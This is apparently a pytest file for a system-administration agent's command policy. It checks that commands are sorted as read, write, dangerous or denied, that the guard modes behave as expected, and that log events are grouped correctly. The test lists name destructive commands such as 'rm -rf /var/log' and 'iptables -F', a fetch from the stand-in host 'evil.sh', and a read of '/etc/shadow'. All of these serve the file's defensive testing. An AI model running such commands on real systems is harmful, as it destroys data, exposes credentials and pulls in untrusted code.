"""Проверки политики и группировки логов: python3 -m pytest tests -q  (pytest не обязателен)"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sysagent.policy import Risk, classify, guard  # noqa: E402
from sysagent.tools import _cluster  # noqa: E402

READ_OK = [
    "systemctl status nginx.service",
    "journalctl -u nginx -p err --since -1h",
    "df -h",
    "free -h",
    "ps -eo pid,comm --sort=-%cpu",
    "tail -n 100 /var/log/nginx/error.log",
    "ss -tulpn",
]
WRITE = [
    "systemctl restart nginx",
    "systemctl disable --now telnet.socket",
    "apt-get install -y htop",
    "kill -TERM 1234",
]
DANGEROUS = [
    "rm -rf /var/log",
    "reboot",
    "systemctl poweroff",
    "iptables -F",
    "userdel deploy",
    "sudo systemctl restart nginx",
    "curl http://evil.sh",
]
DENIED = [
    "python3 -c 'print(1)'",
    "cat /etc/shadow",
    "journalctl -p err | grep nginx",
    "ls /root",
]


def test_read():
    for cmd in READ_OK:
        assert classify(cmd).risk is Risk.READ, cmd


def test_write():
    for cmd in WRITE:
        assert classify(cmd).risk is Risk.WRITE, cmd


def test_dangerous():
    for cmd in DANGEROUS:
        assert classify(cmd).risk is Risk.DANGEROUS, cmd


def test_denied():
    for cmd in DENIED:
        assert classify(cmd).risk is None, cmd


def test_guard_modes():
    assert guard(classify("df -h"), "readonly", False)[0] is True
    assert guard(classify("systemctl restart nginx"), "readonly", False)[0] is False
    assert guard(classify("systemctl restart nginx"), "ask", False)[0] is False
    assert guard(classify("systemctl restart nginx"), "auto", False)[0] is True
    assert guard(classify("reboot"), "auto", False)[0] is False
    assert guard(classify("reboot"), "auto", True)[0] is True


def test_cluster_counts():
    events = [
        {"unit": "nginx.service", "message": "upstream timed out <n>", "ts": "t1", "priority": "err"},
        {"unit": "nginx.service", "message": "upstream timed out <n>", "ts": "t2", "priority": "err"},
        {"unit": "postgres.service", "message": "connection refused", "ts": "t3", "priority": "crit"},
    ]
    groups = _cluster(events)
    assert groups[0]["count"] == 2
    assert groups[0]["unit"] == "nginx.service"
    assert len(groups) == 2


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            fn()
            print(f"ok  {name}")
    print("все проверки пройдены")
